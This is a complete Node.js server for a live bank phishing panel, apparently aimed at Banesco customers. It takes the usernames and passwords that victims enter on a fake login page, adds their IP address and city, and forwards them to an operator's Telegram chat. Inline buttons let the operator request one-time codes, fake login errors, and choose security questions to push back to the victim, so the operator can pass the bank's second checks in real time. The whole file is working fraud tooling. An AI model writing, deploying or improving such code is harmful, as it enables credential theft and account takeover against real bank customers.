const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}
function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

const preguntasLista = [
  "¿Cuál fue el nombre de mi primer novio(a)?",
  "¿Cuál fue el nombre de mi primer colegio?",
  "¿Dónde conoció a su pareja?",
  "¿Cuál es la fecha aniversario de matrimonio (DD/MM/AAAA)?",
  "¿Qué país siempre has querido conocer?",
  "¿Quién fue el héroe de su infancia?",
  "¿Cuál es mi carro preferido?",
  "¿Cuál es el nombre de mi mascota?",
  "¿Cuál es su película favorita?",
  "¿Cuál es el segundo apellido de su padre o madre?",
  "¿Cuál es su pasatiempo favorito?",
  "¿Dónde fue su luna de miel?",
  "¿Cuál es mi postre favorito?",
  "¿Cuál es el nombre de mi profesor preferido?",
  "¿Cuál fue su primer vehículo (marca)?"
];

async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  clientes[txid] = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    estado_custom: false
  };
  guardarEstado();

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];
    const cliente = clientes[txid];

    if (!cliente) return res.sendStatus(404);

    if (accion === 'preguntas_menu') {
      const keyboardPreguntas = { inline_keyboard: [] };

      for (let i = 0; i < preguntasLista.length; i += 2) {
        const fila = [];
        for (let j = 0; j < 2; j++) {
          const idx = i + j;
          if (preguntasLista[idx]) {
            fila.push({
              text: preguntasLista[idx],
              callback_data: `select_question:${txid}:${idx}`
            });
          }
        }
        keyboardPreguntas.inline_keyboard.push(fila);
      }

      keyboardPreguntas.inline_keyboard.push([
        { text: "📝 Pregunta personalizada", callback_data: `custom_question:${txid}` }
      ]);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `Selecciona las preguntas para ${txid} (elige 2):`,
          reply_markup: keyboardPreguntas
        })
      });

      return res.sendStatus(200);
    }

    if (accion === 'select_question') {
      const index = parseInt(partes[2]);
      const pregunta = preguntasLista[index];

      if (!cliente.preguntas.includes(pregunta) && cliente.preguntas.length < 2) {
        cliente.preguntas.push(pregunta);
      }

      if (cliente.preguntas.length === 2) {
        cliente.status = 'preguntas';
      }

      guardarEstado();

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callback.id,
          text: `Seleccionaste: ${pregunta}`
        })
      });

      return res.sendStatus(200);
    }

    if (accion === 'custom_question') {
      cliente.estado_custom = true;
      guardarEstado();

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `✍️ Escribe la pregunta personalizada para ${txid}.`
        })
      });

      return res.sendStatus(200);
    }

    cliente.status = accion;
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.message) {
    const message = req.body.message;
    const chatId = message.chat.id;
    const text = message.text;

    const txid = Object.keys(clientes).find(id => clientes[id].estado_custom);
    if (!txid) return res.sendStatus(200);

    const cliente = clientes[txid];
    if (!cliente) return res.sendStatus(200);

    if (!cliente.preguntas.includes(text) && text.trim().length > 0) {
      cliente.preguntas.push(text.trim());
    }

    cliente.estado_custom = false;

    if (cliente.preguntas.length === 2) {
      cliente.status = 'preguntas';
      guardarEstado();

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `✅ Pregunta personalizada guardada: "${text}"

Preguntas actuales para ${txid}:
1️⃣ ${cliente.preguntas[0]}
2️⃣ ${cliente.preguntas[1]}`
        })
      });
    } else {
      guardarEstado();

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `✅ Pregunta personalizada guardada: "${text}"

1️⃣ ${cliente.preguntas[0]}
❗ Aún falta una pregunta más.`
        })
      });
    }

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));
app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
